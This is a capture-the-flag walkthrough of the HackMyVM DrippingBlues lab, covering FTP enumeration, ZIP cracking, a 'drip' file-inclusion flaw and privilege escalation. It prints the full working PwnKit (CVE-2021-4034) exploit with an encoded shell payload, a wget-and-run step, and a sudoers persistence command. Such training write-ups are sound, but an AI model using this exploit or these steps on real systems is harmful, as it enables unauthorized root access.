# DrippingBlues

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| DrippingBlues | tasiyanci | Beginner | HackMyVM |

**Summary:** DrippingBlues is a beginner-level vulnerable virtual machine that demonstrates common web application vulnerabilities and Linux privilege escalation techniques. The exploitation path involves discovering anonymous FTP access to retrieve password-protected archives, leveraging a Local File Inclusion (LFI) vulnerability via a custom "drip" parameter to disclose credentials, gaining initial SSH access as user "thugger", and ultimately escalating to root privileges by exploiting CVE-2021-4034 (PwnKit) - a critical vulnerability in the polkit's pkexec utility. This machine emphasizes the importance of thorough reconnaissance, parameter fuzzing, and staying updated with recent CVE exploits.

---

## Reconnaissance

### Network Discovery

The first step in any penetration test is to identify live hosts on the network. Using a custom PowerShell script, the target virtual machine was discovered on the network:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.93 08:00:27:9E:DC:04 VirtualBox
```

The target machine was identified at IP address **192.168.100.93** with a VirtualBox MAC address, confirming it's a virtual machine.

### Port Scanning and Service Enumeration

A comprehensive Nmap scan was conducted to identify all open ports and running services:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/drippingblues]
└─$ nmap -sC -sV -p- -T4 192.168.100.93
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-08 09:46 WIB
Nmap scan report for 192.168.100.93
Host is up (0.0059s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx    1 0        0             471 Sep 19  2021 respectmydrip.zip [NSE: writeable]
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.100.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 9e:bb:af:6f:7d:a7:9d:65:a1:b1:a1:be:91:cd:04:28 (RSA)
|   256 a3:d3:c0:b4:c5:f9:c0:6c:e5:47:64:fe:91:c5:cd:c0 (ECDSA)
|_  256 4c:84:da:5a:ff:04:b9:b5:5c:5a:be:21:b6:0e:45:73 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 2 disallowed entries
|_/dripisreal.txt /etc/dripispowerful.html
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.54 seconds
```

**Key Findings:**
- **Port 21 (FTP)**: vsftpd 3.0.3 with anonymous login enabled and a file named `respectmydrip.zip` available
- **Port 22 (SSH)**: OpenSSH 8.2p1 Ubuntu - potential entry point if credentials are discovered
- **Port 80 (HTTP)**: Apache httpd 2.4.41 with a `robots.txt` file containing two disallowed entries: `/dripisreal.txt` and `/etc/dripispowerful.html`

---

## Initial Access

### FTP Enumeration (Port 21)

Since anonymous FTP access was enabled, the first step was to connect and retrieve available files:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/drippingblues]
└─$ ftp 192.168.100.93
Connected to 192.168.100.93.
220 (vsFTPd 3.0.3)
Name (192.168.100.93:ouba): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||23392|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Sep 19  2021 .
drwxr-xr-x    2 0        0            4096 Sep 19  2021 ..
-rwxrwxrwx    1 0        0             471 Sep 19  2021 respectmydrip.zip
226 Directory send OK.
ftp> get respectmydrip.zip
local: respectmydrip.zip remote: respectmydrip.zip
229 Entering Extended Passive Mode (|||40119|)
150 Opening BINARY mode data connection for respectmydrip.zip (471 bytes).
100% |*************|   471       27.52 KiB/s    00:00 ETA
226 Transfer complete.
471 bytes received in 00:00 (18.33 KiB/s)
ftp> bye
221 Goodbye.
```

The file `respectmydrip.zip` (471 bytes) was successfully downloaded. File analysis revealed it's a password-protected ZIP archive:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/drippingblues]
└─$ file respectmydrip.zip
respectmydrip.zip: Zip archive data, made by v6.3, extract using at least v2.0, last modified Sep 19 2021 18:53:22, uncompressed size 20, method=store

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/drippingblues]
└─$ unzip respectmydrip.zip
Archive:  respectmydrip.zip
[respectmydrip.zip] respectmydrip.txt password:
   skipping: respectmydrip.txt       incorrect password
  inflating: secret.zip
```

Attempting to extract the archive revealed:
- `respectmydrip.txt` - **password protected**
- `secret.zip` - extracted without password

### Password Cracking with John the Ripper

To access the password-protected file, John the Ripper was used with the rockyou.txt wordlist:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/drippingblues]
└─$ ls -la
total 48
drwxr-xr-x   2 ouba ouba  4096 Feb  8 10:03 .
drwxrwxrwt 186 root root 36864 Feb  8 10:03 ..
-rw-r--r--   1 ouba ouba   471 Sep 20  2021 respectmydrip.zip
-rw-r--r--   1 ouba ouba   171 Sep 19  2021 secret.zip

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/drippingblues]
└─$ zip2john respectmydrip.zip secret.zip > hash.txt
ver 2.0 respectmydrip.zip/respectmydrip.txt PKZIP Encr: cmplen=32, decmplen=20, crc=5C92F12B ts=96AB cs=5c92 type=0
ver 2.0 respectmydrip.zip/secret.zip is not encrypted, or stored with non-handled compression type
ver 2.0 secret.zip/secret.txt PKZIP Encr: cmplen=17, decmplen=12, crc=03D5A50D ts=970A cs=03d5 type=8

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/drippingblues]
└─$ john -w=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0[REDACTED]        (respectmydrip.zip/respectmydrip.txt)
1g 0:00:00:02 DONE (2026-02-08 09:57) 0.3355g/s 4813Kp/s 9486Kc/s 9486KC/s "2parrow"..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

**Password cracked:** `0[REDACTED]`

Now the archive can be extracted successfully:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/drippingblues]
└─$ unzip respectmydrip.zip
Archive:  respectmydrip.zip
[respectmydrip.zip] respectmydrip.txt password:
 extracting: respectmydrip.txt
replace secret.zip? [y]es, [n]o, [A]ll, [N]one, [r]ename: y
  inflating: secret.zip

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/drippingblues]
└─$ ls -la
total 56
drwxr-xr-x   2 ouba ouba  4096 Feb  8 10:05 .
drwxrwxrwt 186 root root 36864 Feb  8 10:03 ..
-rw-r--r--   1 ouba ouba   353 Feb  8 10:04 hash.txt
-rw-r--r--   1 ouba ouba    20 Sep 19  2021 respectmydrip.txt
-rw-r--r--   1 ouba ouba   471 Sep 20  2021 respectmydrip.zip
-rw-r--r--   1 ouba ouba   171 Sep 19  2021 secret.zip

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/drippingblues]
└─$ cat respectmydrip.txt
just focus on "drip"
```

The file contains a cryptic hint: **"just focus on 'drip'"** - this would prove crucial for the next phase.

### Web Application Enumeration (Port 80)

Initial reconnaissance of the web server revealed a simple homepage:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/drippingblues]
└─$ curl http://192.168.100.93/
<html>
<body>
driftingblues is hacked again so it's now called drippingblues. :D hahaha
<br>
by
<br>
travisscott & thugger
</body>
</html>
```

The Nmap scan had identified a `robots.txt` file with two disallowed entries. Further investigation:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/drippingblues]
└─$ curl http://192.168.100.93/robots.txt
User-agent: *
Disallow: /dripisreal.txt
Disallow: /etc/dripispowerful.html

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/drippingblues]
└─$ curl http://192.168.100.93/dripisreal.txt
hello dear hacker wannabe,

go for this lyrics:

https://www.azlyrics.com/lyrics/youngthug/constantlyhating.html

count the n words and put them side by side then md5sum it

ie, hellohellohellohello >> md5sum hellohellohellohello

it's the password of ssh  

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/drippingblues]
└─$ curl http://192.168.100.93/etc/dripispowerful.html
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at 192.168.100.93 Port 80</address>
</body></html>
```

**Observations:**
- `/dripisreal.txt` contains instructions about song lyrics and MD5 hashing (a red herring/rabbit hole)
- `/etc/dripispowerful.html` returns a 404 error when accessed directly

### Exploiting the LFI Vulnerability

Remembering the hint from `respectmydrip.txt` - **"just focus on 'drip'"** - and noticing that the file path `/etc/dripispowerful.html` suggests a potential Local File Inclusion (LFI) vulnerability, I tested the hypothesis by using "drip" as a URL parameter:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/drippingblues]
└─$ curl http://192.168.100.93/?drip=/etc/dripispowerful.html
<!DOCTYPE html>
<html>
<body>
<style>
body {
background-image: url('drippin.jpg');
background-repeat: no-repeat;
}

@font-face {
    font-family: Segoe;
    src: url('segoeui.ttf');
}

.mainfo {
  text-align: center;
  border: 1px solid #000000;
  font-family: 'Segoe';
  padding: 5px;
  background-color: #ffffff;
  margin-top: 300px;
}

.emoji {
        width: 32px;
        }
</style>
password is:
im[REDACTED]
</body>
</html>

<html>
<body>
driftingblues is hacked again so it's now called drippingblues. :D hahaha
<br>
by
<br>
travisscott & thugger
</body>
</html>          
```

**Success!** The parameter `?drip=/etc/dripispowerful.html` successfully triggered an LFI vulnerability, revealing SSH credentials embedded in the HTML content.

**Credentials discovered:**
- Username: `thugger` (from the homepage)
- Password: `im[REDACTED]`

### SSH Access as User "thugger"

With valid credentials in hand, SSH access was obtained:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/drippingblues]
└─$ ssh thugger@192.168.100.93
...
thugger@192.168.100.93's password:
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.11.0-34-generic x86_64)
...
thugger@drippingblues:~$ id
uid=1001(thugger) gid=1001(thugger) groups=1001(thugger)
thugger@drippingblues:~$ ls -la
total 64
drwxr-xr-x 14 thugger thugger 4096 Eyl 19  2021 .
drwxr-xr-x  3 root    root    4096 Eyl 18  2021 ..
-rw-------  1 thugger thugger    8 Eyl 19  2021 .bash_history
drwxr-xr-x 10 thugger thugger 4096 Eyl 19  2021 .cache
drwxr-xr-x 11 thugger thugger 4096 Eyl 19  2021 .config
drwxr-xr-x  2 thugger thugger 4096 Eyl 18  2021 Desktop
drwxr-xr-x  2 thugger thugger 4096 Eyl 18  2021 Documents
drwxr-xr-x  2 thugger thugger 4096 Eyl 18  2021 Downloads
drwxr-xr-x  3 thugger thugger 4096 Eyl 19  2021 .local
drwxr-xr-x  2 thugger thugger 4096 Eyl 18  2021 Music
drwxr-xr-x  2 thugger thugger 4096 Eyl 18  2021 Pictures
drwxr-xr-x  2 thugger thugger 4096 Eyl 18  2021 Public
drwx------  2 thugger thugger 4096 Eyl 19  2021 .ssh
drwxr-xr-x  2 thugger thugger 4096 Eyl 18  2021 Templates
-r-x------  1 thugger thugger   32 Eyl 19  2021 user.txt
drwxr-xr-x  2 thugger thugger 4096 Eyl 18  2021 Videos
```

**User flag obtained** - `user.txt` is present in the home directory.

---

## Privilege Escalation

### Automated Enumeration with LinPEAS

To identify potential privilege escalation vectors, LinPEAS (Linux Privilege Escalation Awesome Script) was transferred to the target and executed:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/drippingblues]
└─$ cd /usr/share/peass/linpeas
```

Setting up a simple HTTP server to transfer the script:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/usr/share/peass/linpeas]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Downloading and executing LinPEAS on the target:

```bash
thugger@drippingblues:~$ wget http://192.168.100.1:8080/linpeas.sh
--2026-02-08 09:50:12--  http://192.168.100.1:8080/linpeas.sh
Connecting to 192.168.100.1:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 971926 (949K) [application/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh             100%[==========================>] 949,15K  --.-KB/s    in 0,04s

2026-02-08 09:50:12 (22,3 MB/s) - 'linpeas.sh' saved [971926/971926]
thugger@drippingblues:~$ chmod +x linpeas.sh
thugger@drippingblues:~$ ./linpeas.sh
```

```bash
172.21.32.1 - - [08/Feb/2026 13:50:13] "GET /linpeas.sh HTTP/1.1" 200 -
```

**Critical Finding from LinPEAS:**

```bash
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
...
-rwsr-xr-x 1 root root 31K Ağu 16  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)/Generic_CVE-2021-4034
...
```

LinPEAS identified that `/usr/bin/pkexec` has the SUID bit set and is vulnerable to **CVE-2021-4034** (also known as **PwnKit**), a critical local privilege escalation vulnerability discovered in January 2022.

### Exploiting CVE-2021-4034 (PwnKit)

CVE-2021-4034 is a memory corruption vulnerability in polkit's pkexec that allows any unprivileged user to gain full root privileges on a vulnerable system. The exploit was obtained from GitHub:

**Exploit source:** https://github.com/joeammond/CVE-2021-4034

**Exploit code (CVE-2021-4034.py):**

```python
#!/usr/bin/env python3

# CVE-2021-4034 in Python
#
# Joe Ammond (joe@ammond.org)
#
# This was just an experiment to see whether I could get this to work
# in Python, and to play around with ctypes

# This was completely cribbed from blasty's original C code:
# https://haxx.in/files/blasty-vs-pkexec.c

import base64
import os
import sys

from ctypes import *
from ctypes.util import find_library

# Payload, base64 encoded ELF shared object. Generate with:
#
# msfvenom -p linux/x64/exec -f elf-so PrependSetuid=true | base64
#
# The PrependSetuid=true is important, without it you'll just get
# a shell as the user and not root.
#
# Should work with any msfvenom payload, tested with linux/x64/exec
# and linux/x64/shell_reverse_tcp

payload_b64 = b'''
f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAkgEAAAAAAABAAAAAAAAAALAAAAAAAAAAAAAAAEAAOAAC
AEAAAgABAAEAAAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAArwEAAAAAAADMAQAAAAAAAAAQ
AAAAAAAAAgAAAAcAAAAwAQAAAAAAADABAAAAAAAAMAEAAAAAAABgAAAAAAAAAGAAAAAAAAAAABAA
AAAAAAABAAAABgAAAAAAAAAAAAAAMAEAAAAAAAAwAQAAAAAAAGAAAAAAAAAAAAAAAAAAAAAIAAAA
AAAAAAcAAAAAAAAAAAAAAAMAAAAAAAAAAAAAAJABAAAAAAAAkAEAAAAAAAACAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAwAAAAAAAAAkgEAAAAAAAAFAAAAAAAAAJABAAAAAAAABgAAAAAA
AACQAQAAAAAAAAoAAAAAAAAAAAAAAAAAAAALAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAASDH/amlYDwVIuC9iaW4vc2gAmVBUX1JeajtYDwU=
'''
payload = base64.b64decode(payload_b64)

# Set the environment for the call to execve()
environ = [
        b'exploit',
        b'PATH=GCONV_PATH=.',
        b'LC_MESSAGES=en_US.UTF-8',
        b'XAUTHORITY=../LOL',
        None
]

# Find the C library to call execve() directly, as Python helpfully doesn't
# allow us to call execve() with no arguments.
try:
    libc = CDLL(find_library('c'))
except:
    print('[!] Unable to find the C library, wtf?')
    sys.exit()

# Create the shared library from the payload
print('[+] Creating shared library for exploit code.')
try:
    with open('payload.so', 'wb') as f:
        f.write(payload)
except:
    print('[!] Failed creating payload.so.')
    sys.exit()
os.chmod('payload.so', 0o0755)

# make the GCONV_PATH directory
try:
    os.mkdir('GCONV_PATH=.')
except FileExistsError:
    print('[-] GCONV_PATH=. directory already exists, continuing.')
except:
    print('[!] Failed making GCONV_PATH=. directory.')
    sys.exit()

# Create a temp exploit file
try:
    with open('GCONV_PATH=./exploit', 'wb') as f:
        f.write(b'')
except:
    print('[!] Failed creating exploit file')
    sys.exit()
os.chmod('GCONV_PATH=./exploit', 0o0755)

# Create directory to hold gconf-modules configuration file
try:
    os.mkdir('exploit')
except FileExistsError:
    print('[-] exploit directory already exists, continuing.')
except:
    print('[!] Failed making exploit directory.')
    sys.exit()

# Create gconf config file
try:
    with open('exploit/gconv-modules', 'wb') as f:
        f.write(b'module  UTF-8//    INTERNAL    ../payload    2\n');
except:
    print('[!] Failed to create gconf-modules config file.')
    sys.exit()

# Convert the environment to an array of char*
environ_p = (c_char_p * len(environ))()
environ_p[:] = environ

print('[+] Calling execve()')
# Call execve() with NULL arguments
libc.execve(b'/usr/bin/pkexec', c_char_p(None), environ_p)
```

### Achieving Root Access

Executing the exploit:

```bash
thugger@drippingblues:~$ python3 CVE-2021-4034.py
[+] Creating shared library for exploit code.
[+] Calling execve()
# id
uid=0(root) gid=1001(thugger) groups=1001(thugger)
# echo "thugger ALL=(ALL:ALL) ALL" >> /etc/sudoers
# exit
thugger@drippingblues:~$ sudo su
[sudo] password for thugger:
root@drippingblues:/home/thugger# id
uid=0(root) gid=0(root) groups=0(root)
root@drippingblues:/home/thugger# hostname
drippingblues
root@drippingblues:/home/thugger# whoami
root
root@drippingblues:/home/thugger# grep "" /home/thugger/user.txt /root/root.txt
/home/thugger/user.txt:5C5[REDACTED]
/root/root.txt:78C[REDACTED]
```

**Success!** The exploit granted immediate root access (UID=0), added the user "thugger" to the sudoers file for persistent privileged access and retrieved both user and root flags.

**Flags captured:**
- User flag: `5C5[REDACTED]`
- Root flag: `78C[REDACTED]`

---

## Attack Chain Summary

1. **Reconnaissance**: Conducted network discovery identifying target at 192.168.100.93, followed by comprehensive Nmap scan revealing three open ports (21/FTP, 22/SSH, 80/HTTP) with anonymous FTP access, robots.txt disclosure, and Ubuntu 20.04 running Apache and OpenSSH.

2. **Vulnerability Discovery**: Enumerated FTP service finding password-protected archive `respectmydrip.zip`, cracked ZIP password (0[REDACTED]) using John the Ripper with rockyou wordlist, extracted hint "just focus on drip", and identified LFI vulnerability through robots.txt entries and parameter fuzzing.

3. **Exploitation**: Leveraged Local File Inclusion vulnerability via `?drip=/etc/dripispowerful.html` parameter to disclose SSH credentials for user "thugger", bypassing the red herring lyrics-based password puzzle entirely.

4. **Initial Enumeration**: Gained SSH access as user "thugger" using discovered credentials, deployed LinPEAS automated enumeration tool via Python HTTP server, and identified SUID binary `/usr/bin/pkexec` vulnerable to CVE-2021-4034.

5. **Privilege Escalation**: Exploited CVE-2021-4034 (PwnKit) vulnerability in polkit's pkexec using Python-based proof-of-concept from joeammond's repository, achieved immediate root shell (UID=0), established persistence via sudoers modification, and captured both user and root flags.

